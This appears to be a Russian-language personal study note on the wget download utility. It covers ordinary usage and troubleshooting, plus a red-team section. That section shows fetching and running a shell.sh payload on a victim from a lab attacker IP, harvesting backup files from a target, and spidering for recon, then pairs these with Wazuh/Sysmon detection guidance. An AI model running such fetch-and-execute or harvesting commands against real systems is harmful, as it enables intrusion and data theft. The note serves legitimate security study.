---
type: tool
name: Wget
category: Web / Download Utility
platform: Linux, Windows, macOS
language: C
status: studying
tags: [arsenal, web, download, http, automation, red-team, blue-team]
mitre:
  - T1105      # Ingress Tool Transfer
  - T1071.001  # Application Layer Protocol: Web Protocols
  - T1567      # Exfiltration Over Web Service
created: 2025-09-29
---

> [!info] 🛠️ ДОСЬЕ ИНСТРУМЕНТА
> **Название:** Wget (World Wide Web get)
> **Категория:** Web / Download Utility
> **Платформа:** Linux, Windows, macOS
> **Назначение:** Скачивание файлов, зеркалирование сайтов, автоматизация загрузок
> **Статус:** 🟢 Базовый уровень освоен
> **Лаба:** [[IP-Table]]

---

## 📖 I. ЧТО ЭТО

**Wget** — консольная утилита для **неинтерактивного** скачивания файлов из интернета. Поддерживает протоколы **HTTP, HTTPS, FTP**.

**Ключевые возможности:**
- Скачивание отдельных файлов и целых сайтов (рекурсивно).
- Работа в фоне и при нестабильных соединениях (**докачка**).
- Автоматизация загрузок в скриптах.
- Поддержка прокси, аутентификации, ограничения скорости.

> [!tip] Разница с [[curl]]
> **Wget** — для **скачивания**. Рекурсивное зеркалирование, докачка, фоновый режим.
> **Curl** — для **отправки** запросов (GET, POST, PUT). API, кастомные заголовки, JSON.
> Wget лучше для «скачать», curl — для «общаться с API».

---

## 🚀 II. БАЗОВЫЙ СИНТАКСИС

```bash
wget [опции] <URL>
```

---

## 🎯 III. БАЗОВОЕ СКАЧИВАНИЕ

| Команда | Что делает |
|---|---|
| `wget <URL>` | Скачать файл в текущую папку |
| `wget -O myfile.zip <URL>` | Сохранить с другим именем |
| `wget -P /path/ <URL>` | Указать папку для сохранения |
| `wget -c <URL>` | **Продолжить** прерванную загрузку |
| `wget -i list.txt` | Скачать список URL из файла |

### Примеры

```bash
# Просто скачать
wget https://example.com/file.zip

# Своё имя
wget -O myfile.zip https://example.com/file.zip

# В конкретную папку
wget -P /home/user/downloads https://example.com/file.zip

# Докачать прерванный файл (магия: сам найдёт место остановки)
wget -c https://example.com/large-file.iso

# Список URL из файла
wget -i list.txt
```

`list.txt`:
```
https://example.com/file1.zip
https://example.com/file2.zip
https://example.com/file3.zip
```

---

## 🎯 IV. РЕКУРСИВНАЯ ЗАГРУЗКА И ЗЕРКАЛИРОВАНИЕ

> [!warning] Осторожно
> `-r` без ограничений уходит **очень глубоко** и может занять часы. Всегда добавляй `-l` и `-np`.

| Команда | Что делает |
|---|---|
| `wget -r <URL>` | Рекурсивно скачать сайт |
| `wget -r -l 2 <URL>` | Ограничить глубину (2 уровня) |
| `wget -r -np <URL>` | Не подниматься выше начальной директории |
| `wget -p <URL>` | Скачать все ресурсы страницы (CSS, JS, картинки) |
| `wget -r -k <URL>` | Преобразовать ссылки для локального просмотра |
| `wget --mirror <URL>` | Полное зеркало (= `-r -N -l inf -np`) |
| `wget -A "*.pdf" -r <URL>` | Только файлы определённого типа |

### Примеры

```bash
# Скачать сайт глубиной 2
wget -r -l 2 https://example-site.com/

# Только внутри /folder/, не выше
wget -r -np https://example-site.com/folder/

# Страница + все ресурсы (CSS, JS, img)
wget -p https://example-site.com/page.html

# Скачать + преобразовать ссылки для офлайн-просмотра
wget -r -k https://example-site.com/

# Полное зеркало сайта
wget --mirror https://example-site.com/

# Только PDF-файлы
wget -A "*.pdf" -r https://example.com/
```

> [!danger] Зеркалирование
> `--mirror` сайта может быть **нелегальным** (нарушение авторских прав) и **заметным** (много запросов). Только для своей лабы или открытых ресурсов.

---

## 🎯 V. ФОНОВЫЙ РЕЖИМ И СКРИПТЫ

| Команда | Что делает |
|---|---|
| `wget -q <URL>` | Тихий режим (без вывода) |
| `wget -b <URL>` | Запустить в фоне (лог в `wget-log`) |
| `wget --limit-rate=200k <URL>` | Ограничить скорость (200 КБ/с) |
| `wget --spider <URL>` | Проверить существование (не скачивать) |
| `wget -o download.log <URL>` | Записать вывод в лог |
| `wget -N <URL>` | Скачать только если файл новее локальной копии |

### Примеры

```bash
# Тихая загрузка (для скриптов)
wget -q https://example.com/file.zip

# В фоне
wget -b https://example.com/large-file.iso

# Ограничить скорость — не занимать весь канал
wget --limit-rate=200k https://example.com/file.zip

# Проверить, существует ли файл
wget --spider https://example.com/file.zip

# Лог в файл
wget -o download.log https://example.com/file.zip

# Обновить только если на сервере новее
wget -N https://example.com/file.zip
```

---

## 🎯 VI. АУТЕНТИФИКАЦИЯ И COOKIES

### HTTP Basic Auth

```bash
# Пароль в истории (небезопасно)
wget --user=username --password=pass https://example.com/protected.zip

# Запросить пароль (безопаснее)
wget --user=username --ask-password https://example.com/protected.zip
```

### Cookies (сессии)

```bash
wget --cookies=on \
     --save-cookies cookies.txt \
     --keep-session-cookies \
     https://example.com/login
```

> [!tip] Для чего
> - Скачать файлы **за авторизацией**.
> - Сохранить сессию, чтобы не логиниться каждый раз.
> - Автоматизация скачивания из закрытых разделов.

---

## 🎯 VII. КОМБИНИРОВАНИЕ ФЛАГОВ

Флаги можно **объединять** для сложных сценариев.

```bash
# Зеркало сайта с ограничением скорости и преобразованием ссылок
wget --mirror --limit-rate=500k --convert-links https://example-site.com/
```

**Что произойдёт:**
1. `--mirror` — скачает всё.
2. `--limit-rate=500k` — не займёт весь канал.
3. `--convert-links` — преобразует ссылки для офлайн-просмотра.

---

## 🏴 VIII. ПРИМЕНЕНИЕ В ИБ

### Скачивание payload'ов на цель

```bash
# На атакующей машине (Kali)
python3 -m http.server 8000

# На жертве (Linux)
wget http://192.168.56.107:8000/shell.sh
chmod +x shell.sh
./shell.sh
```

### Автоматизация сбора данных

```bash
# Скачать все .txt из открытой директории
wget -r -np -A "*.txt" http://target.com/files/

# Собрать бэкапы
wget -r -np -A "*.bak,*.old,*.zip" http://target.com/
```

### Recon через spider

```bash
wget --spider -r -nd -nv http://target.com/
```

Проходит по ссылкам, **не скачивая файлы** — просто проверяет, что доступно.

---

## 🛡️ IX. ДЕТЕКТ В WAZUH

> [!danger] MITRE
> - **T1105** — Ingress Tool Transfer (Wget на жертве)
> - **T1071.001** — Web Protocols
> - **T1567** — Exfiltration Over Web Service

### Что видит защитник

| Источник | Что искать |
|---|---|
| **Wazuh Agent** | Запуск `wget` на хосте, которого не должно быть |
| **Sysmon Event ID 1** | Процесс `wget` с URL в аргументах |
| **Apache/Nginx access.log** | Массовые запросы к файлам (`*.zip`, `*.pdf`, `*.bak`) |
| **Suricata** | Сигнатуры массовой загрузки |
| **FIM (File Integrity Monitoring)** | Появление новых файлов в `~/`, `/tmp/` |
| **Zeek** | Аномальные HTTP-загрузки |

### Признак wget-атаки (на жертве)

```
Sep 29 10:23:45 ubuntu sudo: msfadmin : TTY=pts/0 ; PWD=/home/msfadmin ; USER=root ; COMMAND=/usr/bin/wget http://192.168.56.107:8000/shell.sh
```

> [!danger] Красные флаги
> - **Wget внутри /tmp/** — загрузка payload.
> - **Wget из необычного процесса** — `apache` запускает `wget`.
> - **Массовые HTTP-запросы** из скомпрометированного хоста.
> - **Загрузки с внешних IP** — эксфильтрация или C2.

### Практика в лабе

1. На Ubuntu:
   ```bash
   wget http://192.168.56.107:8000/shell.sh
   ```
2. Wazuh → **Security events** → фильтр по `wget` в поле `command` или `match`.
3. Настрой FIM на папку `/tmp/` для отслеживания новых файлов.

> [!info] Как защититься
> - **Application whitelist** — запретить `wget` для непривилегированных пользователей.
> - **FIM** — мониторинг новых файлов в критичных папках.
> - **Egress filtering** — блок исходящих соединений из серверов.
> - **Sysmon** — мониторинг процессов с аргументами.
> - **Антивирус/EDR** — детект известных payload'ов.

---

## 🩺 X. ТРОУБЛШУТИНГ

| Проблема | Решение |
|---|---|
| `wget: command not found` | `sudo apt install wget` |
| `403 Forbidden` | Смени User-Agent: `--user-agent="Mozilla/5.0"` |
| `SSL certificate problem` | Добавь `--no-check-certificate` (небезопасно!) |
| Прерывается на больших файлах | `wget -c` — докачка |
| Медленно | `--limit-rate=0` (снять ограничение) |
| Не скачивает CSS/JS | Добавь `-p` (`--page-requisites`) |
| Бесконечная рекурсия | `-l 2` + `-np` |
| Кракозябры в именах файлов | `--restrict-file-names=nocontrol` |

### Смена User-Agent

```bash
wget --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64)" https://example.com/file.zip
```

### Игнор SSL (для self-signed)

```bash
wget --no-check-certificate https://192.168.56.20/file.zip
```

---

## 🔗 XI. СВЯЗИ

- **Инструменты:** [[curl]], [[nc]], [[python-http-server]], [[git]]
- **Техники:** [[T1105]], [[T1071.001]], [[T1567]]
- **Лаба:** [[IP-Table]]
- **Жертвы:** [[Ubuntu Server]], [[Metasploitable2.md]]
- **Защита:** [[Wazuh]], [[Sysmon]]

---

## 📚 XII. ЧТО ИЗУЧИТЬ ДАЛЬШЕ

- [ ] `aria2` — многопоточная загрузка.
- [ ] `curl` — разница в подходах.
- [ ] `rsync` — синхронизация директорий.
- [ ] `nc` (netcat) — передача файлов между машинами.
- [ ] Настройка FIM в Wazuh для мониторинга `/tmp/`.
- [ ] Egress filtering через iptables.

---

## 📝 XIII. ШПАРГАЛКА

```bash
# Скачать файл
wget https://example.com/file.zip

# Со своим именем
wget -O myfile.zip https://example.com/file.zip

# В папку
wget -P /tmp/downloads/ https://example.com/file.zip

# Докачать прерванное
wget -c https://example.com/large.iso

# Список URL из файла
wget -i list.txt

# Зеркало сайта (глубина 2)
wget -r -l 2 -np -k https://example-site.com/

# Только PDF
wget -A "*.pdf" -r https://example.com/

# В фоне
wget -b https://example.com/large.iso

# Тихо
wget -q https://example.com/file.zip

# С аутентификацией
wget --user=admin --ask-password https://example.com/protected.zip

# С cookies
wget --save-cookies cookies.txt --keep-session-cookies https://example.com/login

# Проверка ссылки (без скачивания)
wget --spider https://example.com/file.zip

# Свой User-Agent
wget --user-agent="Mozilla/5.0" https://example.com/file.zip
```

---

> [!abstract] 🐍 HYDRA DOMINATUS
> *Vigilo. Vexo. Vinco.*
> *Wget — это рабочий конь. Не самый быстрый, не самый красивый, но довезёт до конца. Даже если связь прервётся — он продолжит с того же места.*